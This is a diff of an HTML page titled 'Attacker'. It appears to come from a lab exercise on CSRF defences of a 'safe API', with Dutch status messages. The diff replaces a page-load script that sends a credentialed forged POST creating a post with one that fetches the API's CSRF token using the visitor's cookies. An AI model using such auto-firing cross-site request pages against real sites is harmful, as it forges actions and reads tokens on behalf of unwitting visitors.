@@ -1,7 +1,7 @@
 <html>
 <head>
     <meta charset="UTF-8" />
-    <title>Attacker - Post Create Post</title>
+    <title>Attacker - GET CSRF Cookie</title>
     <script>
         const website = "https://safe-api.ian-chains.be/";
         const CSRF_COOKIE_NAME = "csrf_token";
@@ -22,33 +22,24 @@
             return match ? decodeURIComponent(match[1]) : null;
         }
 
-        async function create_post() {
-            const url = website + "posts";
-            set_status('Post aanmaken...', 'info');
+        async function get_csrf_token_value() {
+            const url = website + "csrf-token";
+            set_status('CSRF Token ophalen...', 'info');
 
             try {
                 const response = await fetch(url, {
-                    method: "POST",
-                    headers: {
-                        'Content-Type': "application/x-www-form-urlencoded",
-                        [CSRF_HEADER_NAME]: get_csrf_token()
-                    },
-                    credentials: 'include',
-                    body: new URLSearchParams({
-                        title: "CSRF Attack Post Safe API",
-                        content: "This is the content of the CSRF attack post of the safe API."
-                    })
+                    credentials: 'include'
                 });
 
                 const result = await response.json();
                 if (!response.ok) {
                     console.error('Status:', response.status, 'Error:', result);
-                    set_status('Fout bij aanmaken van post (HTTP ' + response.status + ').', 'error');
+                    set_status('Fout bij ophalen CSRF token (HTTP ' + response.status + ').', 'error');
                     return;
                 }
 
-                console.log('Post created successfully:', result);
-                set_status('Post succesvol aangemaakt.', 'success');
+                console.log('CSRF Token:', result);
+                set_status('CSRF Token succesvol opgehaald.', 'success');
                 return;
             } catch (error) {
                 console.error(error);
@@ -57,12 +48,12 @@
         }
 
         window.onload = () => {
-            create_post();
+            get_csrf_token_value();
         };
     </script>
 </head>
 <body>
-<h1 class="text-3xl font-bold mb-4">Post Create Post</h1>
+<h1 class="text-3xl font-bold mb-4">CSRF Token Ophalen</h1>
 <p id="status">Wachten op laden...</p>
 <body>
 </html>
